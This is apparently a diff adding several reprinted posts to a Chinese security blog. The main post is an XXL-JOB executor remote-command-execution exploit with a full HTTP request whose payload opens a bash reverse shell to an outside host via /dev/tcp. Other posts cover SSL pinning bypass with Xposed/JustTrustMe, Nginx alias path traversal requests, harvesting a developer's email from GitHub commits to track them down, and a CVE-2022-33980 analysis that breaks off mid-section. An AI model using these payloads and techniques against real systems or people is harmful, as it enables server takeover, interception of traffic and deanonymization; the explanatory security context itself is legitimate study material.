@@ -87,6 +87,423 @@
 
     
         <h2 class="title">
+            <a href="/2023/09/03/XXL-JOB-Executor/">
+                XXL-JOB executor未授权访问漏洞
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="xxl-job-executor未授权访问漏洞">XXL-JOB executor未授权访问漏洞</span></h1><h2><span id="漏洞详情">漏洞详情</span></h2><blockquote>
+<p>XXL-JOB是一个轻量级分布式任务调度平台。默认情况下XXL-JOB的Restful API接口或RPC接口没有配置认证措施，未授权的攻击者可构造恶意请求，造成远程执行命令，直接控制服务器。</p>
+</blockquote>
+<h2><span id="漏洞影响">漏洞影响</span></h2><blockquote>
+<p>XXL-JOB &lt;&#x3D; 2.2.0</p>
+</blockquote>
+<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
+<p>XXL-JOB的Restful API分为两种，一个 调度中心Restful API，一个 执行器Restful API。其中在执行器Restful API的任务触发声明中，发送请求的数据格式为：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">地址格式：</span><br><span class="line">    &#123;执行器内嵌服务跟地址&#125;/run 	<span class="comment">//也就是说为executor端的地址，ip:9999/run</span></span><br><span class="line"> </span><br><span class="line">Header： </span><br><span class="line">    XXL-JOB-ACCESS-TOKEN : &#123;请求令牌&#125; 	</span><br><span class="line"> </span><br><span class="line">请求数据格式如下，放置在 RequestBody 中，JSON格式： </span><br><span class="line">&#123; </span><br><span class="line">    <span class="string">&quot;jobId&quot;</span>:<span class="number">1</span>, <span class="comment">// 任务ID </span></span><br><span class="line">    <span class="string">&quot;executorHandler&quot;</span>:<span class="string">&quot;demoJobHandler&quot;</span>, <span class="comment">// 任务标识 </span></span><br><span class="line">    <span class="string">&quot;executorParams&quot;</span>:<span class="string">&quot;demoJobHandler&quot;</span>, <span class="comment">// 任务参数 </span></span><br><span class="line">    <span class="string">&quot;executorBlockStrategy&quot;</span>:<span class="string">&quot;COVER_EARLY&quot;</span>, <span class="comment">// 任务阻塞策略，可选值参考   com.xxl.job.core.enums.ExecutorBlockStrategyEnum </span></span><br><span class="line">    <span class="string">&quot;executorTimeout&quot;</span>:<span class="number">0</span>, <span class="comment">// 任务超时时间，单位秒，大于零时生效 </span></span><br><span class="line">    <span class="string">&quot;logId&quot;</span>:<span class="number">1</span>, <span class="comment">// 本次调度日志ID </span></span><br><span class="line">    <span class="string">&quot;logDateTime&quot;</span>:<span class="number">1586629003729</span>, <span class="comment">// 本次调度日志时间 </span></span><br><span class="line">    <span class="string">&quot;glueType&quot;</span>:<span class="string">&quot;BEAN&quot;</span>, <span class="comment">// 任务模式，可选值参考 com.xxl.job.core.glue.GlueTypeEnum 		&quot;glueSource&quot;:&quot;xxx&quot;, // GLUE脚本代码 </span></span><br><span class="line">    <span class="string">&quot;glueUpdatetime&quot;</span>:<span class="number">1586629003727</span>, <span class="comment">// GLUE脚本更新时间，用于判定脚本是否变更以及是否需要刷新 </span></span><br><span class="line">    <span class="string">&quot;broadcastIndex&quot;</span>:<span class="number">0</span>, <span class="comment">// 分片参数：当前分片 </span></span><br><span class="line">    <span class="string">&quot;broadcastTotal&quot;</span>:<span class="number">0</span> <span class="comment">// 分片参数：总分片 </span></span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">响应数据格式： </span><br><span class="line">    &#123; <span class="string">&quot;code&quot;</span>: <span class="number">200</span>, <span class="comment">// 200 表示正常、其他失败 &quot;msg&quot;: null // 错误提示消息 &#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>其中”glueType”:”BEAN” 任务模式的选值如下</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BEAN(<span class="string">&quot;BEAN&quot;</span>, <span class="literal">false</span>, <span class="literal">null</span>, <span class="literal">null</span>),</span><br><span class="line">GLUE_GROOVY(<span class="string">&quot;GLUE(Java)&quot;</span>, <span class="literal">false</span>, <span class="literal">null</span>, <span class="literal">null</span>),</span><br><span class="line">GLUE_SHELL(<span class="string">&quot;GLUE(Shell)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;.sh&quot;</span>), </span><br><span class="line">GLUE_PYTHON(<span class="string">&quot;GLUE(Python)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;python&quot;</span>, <span class="string">&quot;.py&quot;</span>), </span><br><span class="line">GLUE_PHP(<span class="string">&quot;GLUE(PHP)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;php&quot;</span>, <span class="string">&quot;.php&quot;</span>), </span><br><span class="line">GLUE_NODEJS(<span class="string">&quot;GLUE(Nodejs)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;node&quot;</span>, <span class="string">&quot;.js&quot;</span>), </span><br><span class="line">GLUE_POWERSHELL(<span class="string">&quot;GLUE(PowerShell)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;powershell&quot;</span>, <span class="string">&quot;.ps1&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>也就是说我们可以从中任意选择一种脚本语言，然后在”glueSource”:”xxx”中插入相对应的脚本代码即可执行相对应的命令。</p>
+<p>比如对方如果是linux系统的服务器，那么就可以构造反弹shell命令执行代码为：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;glueType&quot;</span>:<span class="string">&quot;GLUE_SHELLl&quot;</span>，</span><br><span class="line"><span class="string">&quot;glueSource&quot;</span>:<span class="string">&quot;/bin/bash / -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2><span id="漏洞利用">漏洞利用</span></h2><blockquote>
+<p>访问XXL-JOB存在漏洞版本的客户端（executor），利用burpsuite发送如下payload：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /run HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ip:<span class="number">9999</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 394</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;jobId&quot;: 1,</span></span><br><span class="line"><span class="comment">  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorTimeout&quot;: 0,</span></span><br><span class="line"><span class="comment">  &quot;logId&quot;: 1,</span></span><br><span class="line"><span class="comment">  &quot;logDateTime&quot;: 1586629003729,</span></span><br><span class="line"><span class="comment">  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,</span></span><br><span class="line"><span class="comment">  &quot;glueSource&quot;: &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.30.1/5555 0&gt;&amp;1&quot;,</span></span><br><span class="line"><span class="comment">  &quot;glueUpdatetime&quot;: 1586699003758,</span></span><br><span class="line"><span class="comment">  &quot;broadcastIndex&quot;: 0,</span></span><br><span class="line"><span class="comment">  &quot;broadcastTotal&quot;: 0</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2023/09/03/XXL-JOB-Executor/1.png" alt="image"></p>
+<p>开启监听后，即可反弹回shell</p>
+<p><img src="/2023/09/03/XXL-JOB-Executor/2.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XXL-JOB/" rel="tag">XXL-JOB</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/Xposed-HTTPS/">
+                夜神模拟器+Xposed框架+JustTrustMe（用来禁用、绕过 SSL 证书检查）来突破SSL Pinning
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="夜神模拟器xposed框架justtrustme用来禁用-绕过-ssl-证书检查来突破ssl-pinning">夜神模拟器+Xposed框架+JustTrustMe（用来禁用、绕过 SSL 证书检查）来突破SSL Pinning</span></h1><blockquote>
+<p>1.夜神模拟器官网下载安装 模拟器</p>
+<p>2.创建一个安卓5.1版本的模拟器</p>
+<p><img src="/2023/09/03/Xposed-HTTPS/1.png" alt="image"></p>
+<p>3.把xposed.apk  拖入夜神模拟器 （ Android 5.1.版本，xposed3.1.5 版本） </p>
+<p><img src="/2023/09/03/Xposed-HTTPS/2.png" alt="image"></p>
+<p>4.安装xposed框架</p>
+<p><img src="/2023/09/03/Xposed-HTTPS/3.png" alt="image"></p>
+<p><img src="/2023/09/03/Xposed-HTTPS/4.png" alt="image"></p>
+<p><img src="/2023/09/03/Xposed-HTTPS/5.png" alt="image"></p>
+<p>下载安装完成后， 重启系统</p>
+<p>5.安装JustTrustMe.apk   </p>
+<p>点击“模块”，此时还没有可用的模块，同样的方法点击apk+导入之前下载好的JustTrustMe的apk安装包，系统会自动安装，安装完成后，在模块里面点击“软重启”，再次打开“模块”界面，即可看到JustTrustMe，勾选一下，启用这个模块：</p>
+<p><img src="/2023/09/03/Xposed-HTTPS/6.png" alt="image"></p>
+<p>6.重启生效， 接下载安装 fiddler证书， 设置WLAN代理</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/HTTPS/" rel="tag">HTTPS</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSL/" rel="tag">SSL</a><a class="tag-none-link" href="/tags/Xposed/" rel="tag">Xposed</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/Github-Find-Email/">
+                如何通过 Github 找到一个人？
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="如何通过-github-找到一个人">如何通过 Github 找到一个人？</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.ixiqin.com/2020/01/08/how-to-find-a-person-through-making/#:~:text=%E6%83%B3%E8%A6%81%E9%80%9A%E8%BF%87%20Git%20%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E4%BA%BA%E7%9A%84%E9%82%AE%E7%AE%B1%EF%BC%8C%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%96%B9%E6%B3%95%E5%B0%B1%E6%98%AF%E4%BD%BF%E7%94%A8%20Github%20%E6%8F%90%E4%BE%9B%E7%9A%84%20GraphQL%20%E6%9D%A5%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2%EF%BC%8C%E7%AE%80%E5%8D%95%E6%96%B9%E4%BE%BF%E3%80%82%20%E8%AE%BF%E9%97%AE,in%20%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%BD%A0%E7%9A%84%20Github%20%E8%B4%A6%E5%8F%B7%E7%99%BB%E9%99%86%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%B0%83%E7%94%A8%20Github%20%E7%9A%84%20API%20%E4%BA%86%E3%80%82">白宦成</a> 并作补充</p>
+</blockquote>
+<blockquote>
+<p>很多时候，我们都需要找到一个人的联系方式。但是，并不是每一次我们都可以很好的拿到他的联系方式，这个时候，我们就需要借助一些奇技淫巧来找到一个人的联系方式。</p>
+</blockquote>
+<h2><span id="requirements">Requirements</span></h2><blockquote>
+<p>Github 账号</p>
+<p>你要找的人的 GitHub 账号（需要其账号下有仓库）</p>
+</blockquote>
+<h2><span id="原理">原理</span></h2><blockquote>
+<p>在我们使用 Git 进行版本控制时，一开始，我们会被要求设置一个 Git 的用户名和邮箱，就像下面这样。</p>
+<p><img src="/2023/09/03/Github-Find-Email/1.png" alt="image"></p>
+<p>后续，我们的每一个 Commit 都会基于我们填写的用户名和邮箱来进行存储。我们只需要查询一个人在 Github 的提交记录，就可以找到他填写在 Git 中的邮箱和名字，从而方便我们更进一步找到这个人。</p>
+</blockquote>
+<h2><span id="实践">实践</span></h2><blockquote>
+<p>想要通过 Git 找到一个人的邮箱，最简单的方法就是使用 Github 提供的 GraphQL 来进行查询，简单方便。</p>
+<p>访问Github 的 GraphQL API Explorer，点击右侧的 Sign in ，使用你的 Github 账号登陆，这样就可以调用 Github 的 API 了。</p>
+<p><img src="/2023/09/03/Github-Find-Email/2.png" alt="image"></p>
+<p>登陆后，你下方的 GraphQL 输入框就可以输入内容了。在其中输入如下代码</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  repository(name: <span class="string">&quot;grank&quot;</span>, owner: <span class="string">&quot;lctt&quot;</span>) &#123;</span><br><span class="line">    ref(qualifiedName: <span class="string">&quot;master&quot;</span>) &#123;</span><br><span class="line">      target &#123;</span><br><span class="line">        ... on Commit &#123;</span><br><span class="line">          id</span><br><span class="line">          <span class="title function_">history</span><span class="params">(first: <span class="number">5</span>)</span> &#123;</span><br><span class="line">            edges &#123;</span><br><span class="line">              node &#123;</span><br><span class="line">                author &#123;</span><br><span class="line">                  name</span><br><span class="line">                  email</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>并将 name 替换为你要查询的人的 repo 名，owner 改为你需要查询的人的名字，然后点击执行按钮。</p>
+<p><img src="/2023/09/03/Github-Find-Email/3.png" alt="image"></p>
+<p>右侧会出现你的执行结果，你会发现，其中出现我们想要的“邮箱”地址。</p>
+<p><img src="/2023/09/03/Github-Find-Email/4.png" alt="image"></p>
+<p>你会发现，这里其实有两种类型的邮箱，一种是我们常见的，自己用的各种免费邮箱，比如 @qq.com、@gmail.com、@foxmail.com 之类的；另一种是形如 27856297+dependabot-preview[bot]@users.noreply.github.com 这样的邮箱。</p>
+<p>这两种邮箱的区别是，前者是我们自己通过 git 设置的邮箱，而后者则是我们通过 Github 网页、 API 操作产生的 commit 。你在查询的时候，要记得去找第一类邮箱来作为参考。</p>
+<p>当然，不排除有开发者在看了本篇文章后，去用 private 邮箱修改自己本地的 Git ，那就没办法了。</p>
+<p>找到这个邮箱以后怎么办呢？</p>
+<p>直接发邮件联系<br>如果是 QQ 邮箱、 Foxmail ，可以试着直接用邮箱，或者邮箱里的 QQ 号加好友。<br>通过 Google 搜索这个邮箱，查找其他的关联信息。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Github/" rel="tag">Github</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/Nginx-Alias/">
+                Nginx错误配置alias导致目录遍历漏洞
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="nginx错误配置alias导致目录遍历漏洞">Nginx错误配置alias导致目录遍历漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blackwolfsec.cc/2018/05/23/Nginx_alias_misconfig_path_traversle/">BlackWolf</a> 并作补充</p>
+</blockquote>
+<h2><span id="0x00-前言">0x00 前言</span></h2><blockquote>
+<p>nginx错误配置alias，导致存在目录遍历，可跳出限制读取上一层目录及其任意子目录的文件的任意文件。</p>
+</blockquote>
+<h2><span id="0x01-环境搭建">0x01 环境搭建</span></h2><blockquote>
+<p>使用richarvey&#x2F;nginx-php-fpm镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:80  richarvey/nginx-php-fpm</span><br></pre></td></tr></table></figure>
+
+<p>配置nginx，添加配置test路由解析到&#x2F;var&#x2F;www&#x2F;html&#x2F;路径（注意：&#x2F;test没有结尾的&#x2F;）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /etc/nginx/sites-available/default.conf</span><br><span class="line">location /test &#123;</span><br><span class="line">        alias /var/www/html/;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>对应Web服务的文件结构，目标是目录遍历获取flag.txt的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|--var</span><br><span class="line">   |--www</span><br><span class="line">      |--flag.txt</span><br><span class="line">      |--html</span><br><span class="line">         |--index.php</span><br><span class="line">         |--test.txt</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="0x02-漏洞利用">0x02 漏洞利用</span></h2><blockquote>
+<p>通过访问<a target="_blank" rel="noopener" href="http://127.0.0.1/test/test.txt">http://127.0.0.1/test/test.txt</a></p>
+<p>可以成功访问到test的内容如下(&#x2F;test&#x2F;test.txt路由请求，经处理后转换成：&#x2F;var&#x2F;www&#x2F;html&#x2F;test.txt)：</p>
+<p><code>this is a test</code></p>
+<p>修改请求为<a target="_blank" rel="noopener" href="http://127.0.0.1/test../flag.txt%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%88%90%E5%8A%9F%E8%B7%B3%E5%88%B0%E4%B8%8A%E4%B8%80%E5%B1%82%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E8%AF%BB%E5%8F%96%E5%88%B0flag.txt%E7%9A%84%E5%86%85%E5%AE%B9(%60/test../flag.txt%60%E8%B7%AF%E7%94%B1%E8%AF%B7%E6%B1%82%EF%BC%8C%E7%BB%8F%E5%A4%84%E7%90%86%E5%90%8E%E8%BD%AC%E6%8D%A2%E6%88%90%EF%BC%9A%60/var/www/flag.txt%60)">http://127.0.0.1/test../flag.txt，可以成功跳到上一层目录下，读取到flag.txt的内容(`/test../flag.txt`路由请求，经处理后转换成：`/var/www/flag.txt`)</a></p>
+<p><code>you get me, hahaha</code></p>
+</blockquote>
+<h2><span id="0x03-小结">0x03 小结</span></h2><blockquote>
+<p>只能跳到上一层目录，读取上一层目录及其任意子目录的文件，不能任意目录遍历读取任意文件,有局限性。</p>
+<p>需要nginx配置缺陷，实战情况比较有限，但是真实存在（如：参考链接3）。</p>
+<p>一种场景是：很多网站会把备份文件放置在网页目录的上一层路径下，利用遍历读取备份文件；另一种场景是：路由限制到上传或静态图片路径，利用遍历读取上一层路径下的配置文件等。</p>
+</blockquote>
+<h2><span id="0x04-参考链接">0x04 参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md">https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md</a><br><a target="_blank" rel="noopener" href="https://hackerone.com/reports/317201">https://hackerone.com/reports/317201</a><br><a target="_blank" rel="noopener" href="https://hackerone.com/reports/312510">https://hackerone.com/reports/312510</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/Crossdomain-XML/">
+                怎么把网站crossdomain.xml配置风险去除
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="怎么把网站crossdomainxml配置风险去除">怎么把网站crossdomain.xml配置风险去除</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://codeantenna.com/a/AoJYq0YYQe">nanjingbolg</a> 并作补充</p>
+</blockquote>
+<blockquote>
+<p>打开程序目录下的crossdomain.xml文件，确保配置只对提供安全资源的可信域开放：</p>
+<p>源代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0″?&gt;&lt;!DOCTYPE cross-domain-policy SYSTEM ”http://www.macromedia.com/xml/dtds/cross-domain-policy.dtd”&gt;&lt;cross-domain-policy&gt;&lt;allow-access-from domain=”*” /&gt;&lt;/cross-domain-policy&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文件中的allow-access-from 实体设置为星号设置为允许任何域访问，将其修改为:</p>
+<p><code>&lt;allow-access-from domain=”*.17showshow.com” /&gt;</code></p>
+<p>*.17showshow.com 换为您自己的域名(注意是一级域名)。</p>
+<p>表示只允许本域访问，该问题就解决了。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XML/" rel="tag">XML</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/CVE-2022-33980-Apache-Commons/">
+                关于CVE-2022-33980 Apache Commons Configuration 远程命令执行漏洞分析
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="关于cve-2022-33980-apache-commons-configuration-远程命令执行漏洞分析">关于CVE-2022-33980 Apache Commons Configuration 远程命令执行漏洞分析</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/543936119">星阑科技</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>7月6日，Apache官方发布安全公告，修复了一个存在于Apache Commons Configuration 组件的远程代码执行漏洞，漏洞编号：CVE-2022-33980，漏洞威胁等级：高危。恶意攻击者通过该漏洞，可在目标服务器上实现任意代码执行。</p>
+</blockquote>
+<h2><span id="相关介绍">相关介绍</span></h2><blockquote>
+<p>Apache Commons Configuration是一个Java应用程序的配置管理工具，可以从properties或者xml文件中加载软件的配置信息，用来构建支撑软件运行的基础环境。在一些配置文件较多较复杂的情况下，使用该配置工具比较可以简化配置文件的解析和管理，提高开发效率和软件的可维护性。</p>
+</blockquote>
+<h2><span id="利用范围">利用范围</span></h2><blockquote>
+<p>2.4 &lt;&#x3D; Apache Commons Configuration &lt;&#x3D;2.7</p>
+</blockquote>
+<h2><span id="前置知识">前置知识</span></h2><blockquote>
+<p>什么是变量插值？</p>
+<p>通常我们用apach的configuration2库来管理配置文件(org.apache.commons:commons-configuration2),在commons-configuration2管理的配置文件中，配置变量的值可以引用变量。举个例子：${env:xxhzz}就指代环境变量xxhzz，在commons-configuration2中这种引用动态变量的方式就叫变量插值。</p>
+<p>变量插值解析：在commons-configuration2中，负责对字符串中的变量进行解析的是org.apache.commons.configuration2.interpol.ConfigurationInterpolator类中的interpolate(Object)方法。</p>
+</blockquote>
+<h2><span id="漏洞原理">漏洞原理</span></h2><blockquote>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/1.png" alt="image"></p>
+<p>从漏洞通告中，可以得知Apache Commons Configuration执行变量插值，允许动态评估和扩展属性。插值的标准格式是“${prefix:name}”，其中“prefix”用于定位执行插值的org.apache.commons.configuration2.interpol.Lookup 实例。</p>
+<p>从2.4版到2.7版，默认的Lookup实例集包括可能导致任意代码执行或与远程服务器联系的插值器。如公告中提到“script” 可使用JVM脚本执行引擎(javax.script)执行表达式，若使用了不受信任的配置值，在受影响的版本中使用插值默认值的应用程序就很可能受到远程代码执行的影响。</p>
+</blockquote>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<p>了解了漏洞原理后，为更好理解漏洞的形成，需构建一个调试的demo环境。</p>
+<p>通过maven直接引入Apache Commons Configuration2.7。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/2.png" alt="image"></p>
+<p>接着构建一个触发漏洞的主类即可</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/3.png" alt="image"></p>
+</blockquote>
+<h2><span id="动态调式">动态调式</span></h2><blockquote>
+<p>在对插值变量进行解析的地方打下断点。</p>
+<p>org.apache.commons.configuration2.interpol.ConfigurationInterpolator#interpolate</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/4.png" alt="image"></p>
+<p>开启debug模式，在经过了前两个if判断之后，随后会进入resolveSingleVariable函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/5.png" alt="image"></p>
+<p>在org.apache.commons.configuration2.interpol.ConfigurationInterpolator#resolveSingleVariable中首先跟一下extractVariableName函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/6.png" alt="image"></p>
+<p>org.apache.commons.configuration2.interpol.ConfigurationInterpolator#extractVariableName的作用是提取变量字符串strValue。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/7.png" alt="image"></p>
+<p>随后进入org.apache.commons.configuration2.interpol.ConfigurationInterpolator#resolve函数中，通过index0f查找和判断条件，从变量字符串中分别获取到prefix和name。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/8.png" alt="image"></p>
+<p>继续跟进会进入lookup函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/9.png" alt="image"></p>
+<p>在分析lookup函数前先跟进下fetchLookupForPrefix函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/10.png" alt="image"></p>
+<p>fetchLookupForPrefix函数的作用是获取到stringLookup对象。</p>
+<p>继续跟进，会进入commons-text-1.8.jar包中的org.apache.commons.text.lookup.ScriptStringLookup#lookup函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/11.png" alt="image"></p>
+<p>在org.apache.commons.text.lookup.ScriptStringLookup#lookup函数中会再次对字符串进行分割，分别提取engineName和script。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/12.png" alt="image"></p>
+<p>接着会通过getEngineByName函数获取ScriptEngine（javax.script)。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/13.png" alt="image"></p>
+<p>继续往下，出现eval函数。而我们知道eval函数可计算某个字符串，并执行其中的的JavaScript 代码。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/14.png" alt="image"></p>
+<p>继续往下将成功触发我们传入的payload，造成远程命令执行。</p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/15.png" alt="image"></p>
+<p>​成功命令执行。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/16.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复建议">修复建议</span></h2><blockquote>
